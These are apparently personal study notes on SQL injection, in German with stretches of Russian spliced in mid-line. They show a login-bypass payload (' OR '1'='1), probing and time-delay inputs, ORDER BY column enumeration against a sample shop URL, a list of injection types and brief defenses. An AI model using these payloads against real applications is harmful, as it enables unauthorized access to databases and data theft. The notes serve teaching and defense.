#### Bsp 1:
* Query im Programm: `SELECT USERNAME,PASSWORD from USERS where USERNAME='<username>' AND PASSWORD='<password>';`
* => Eingeben in Username- und Password-Felder: `' OR '1'='1`
* => prodziert folgende Query: `SELECT USERNAME,PASSWORD from USERS where USERNAME='' OR '1'='1' AND PASSWORD='' OR '1'='1';`
#### DB auf Schwächen testen
* man kann folgende Eingaben versuchen:
    * `'` 
    * `'' a' or 1=1--` 
    * `"a"" or 1=1--"` 
    + `or a = a, a' waitfor delay '0:0:10'--`
    + `1 waitfor delay '0:0:10'--`
    + `%26`
    + `' or username like '%`
    + oder ähnliche Eingaben
    * <= wenn man merkt, dass App sich anders verhält => Untersützt SQL-Injections
* Zellen bestimmen mit `order by`
    + `www.onlineshopping.com/products.php?pid=8 order by 1 -- //`
    + `www.onlineshopping.com/products.php?pid=8 order by 2 -- //// Если параметр - строка, то надо добавить после него значок «'».www.onlineshopping.com/products.php?usr=b' order by 3 -- //`
    * `www.onlineshopping.com/products.php?usr=a' order by 4 -- //`
    + <= Комментарии в SQL начинаются вот с такой комбинации символов --. Чтобы сохранить пробел после --, просто добавляем любой символ: так пробел не будет игнорироваться в HTTP-запросе. Для комментариев могут использоваться также # или /* */ в зависимости от поставщика базы данных SQL
    * diese Anfrage solange machen, bis kein Fehler kommt => z.B Fehler bei *5* => richtige Anzahl ist *4*
* Typen der SQL-Injections:
    1. На основе ошибки: liefert Error-Message
    2. С использованием UNION: UNIONs werden benutzt um zwei Select-Anfragen zu einer Tabelle zu machen
    3.«Слепая» инъекция: wenn SQL-Injections unterstützt, aber kein HTTP-Response geliefert wird => Anfragen mit true/false veruschen und schauen, wie es sich verhält
    4. На основе данных в ответе сервера: ähnlich wie 3
    5. С использованием времени ответа сервера: 
    6. С использованием особенностей сервера: z.B DB-Inhalte mit HTTP, DNS oder ftp versenden
* Schutz vor SQL-Injections:
    1. SQL-Queries anhand der Parameter erstellen
    2. bevor SQL-Query die Eingabe prüfen
    3. sicheren Driver benutzen